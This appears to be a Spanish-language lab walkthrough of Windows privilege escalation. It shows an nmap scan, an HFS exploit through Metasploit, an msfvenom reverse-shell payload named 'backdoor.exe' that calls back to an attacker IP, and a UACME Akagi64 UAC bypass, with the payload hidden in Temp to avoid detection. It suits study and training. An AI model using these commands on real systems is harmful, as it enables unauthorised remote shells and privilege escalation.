Vamos a realizar una escalada de privilegios con le herramienta UACME
https://github.com/hfiref0x/UACME

Para ello primero realizaremos un escaneo del SO
nmap -sV -sC -p- 10.2.16.121
![[Pasted image 20240311095106.png]]

Una vez visto el puerto que vamos a intentar explotar, revisaremos si hay algun exploit que podamos utilizar
searchsploit hfs
![[Pasted image 20240311095226.png]]

Ahora ejecutamos metasploit y cargamos el exploit
![[Pasted image 20240311100309.png]]

Ahora ejecutamos el exploit y ya habremos obtenido una sesión de meterpreter
![[Pasted image 20240311100423.png]]

Una vez obtenida la sesión, comporbarmos los permisos y que sistema ejecuta, también pasaremos la sesion de x86 a x64
![[Pasted image 20240311101543.png]]

Con el siguiente comandos intentamos hacer una escalada de privilegios
![[Pasted image 20240311103042.png]]


Accedemos a una sesión shell y revisamos que usuarios estan en el grupo de administradores
![[Pasted image 20240311103320.png]]

Ver permisos de un usuario
![[Pasted image 20240311103611.png]]

![[Pasted image 20240311103703.png]]

Los permisos que deberian estar activados para poder tener UAC habilitado son:
- SeDebugPrivilege
- SeTcbPrivilege


Crearemos un payload con msfvenom para obtener la sesión con privilegios
msfvenom windows/meterpreter/reverse_tcp LHOST=10.10.18.3 LPORT=4444 -f exe > 'backdoor.exe'
![[Pasted image 20240311112556.png]]

Una vez tenemos creado el payload, lo siguiente que haremos sera cargar tanto el payload como el programa ejecutable de Akagi64.exe en la carpeta de la maquina victima, nosotros lo realizaremos en la carpeta Temp para que resulte mas dificil detectarnos
![[Pasted image 20240311113016.png]]

Abrimos otra terminal para ejecutar otra consola de Metasploit
![[Pasted image 20240311113335.png]]

Como podemos ver ya estamos a la escucha desde metasploit, ahora volveremos a nuestra sesions de meterpreter y ejecutaremos Akagi64
Ejecutamos el siguiente comando
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
![[Pasted image 20240311113619.png]]

Una vez ejecutamos el payload en la maquina victima volveremos a nuestra sesion con el exploit de multi/handler abierto y como veremos ya obtenemos la sesion con privilegios
![[Pasted image 20240311114922.png]]



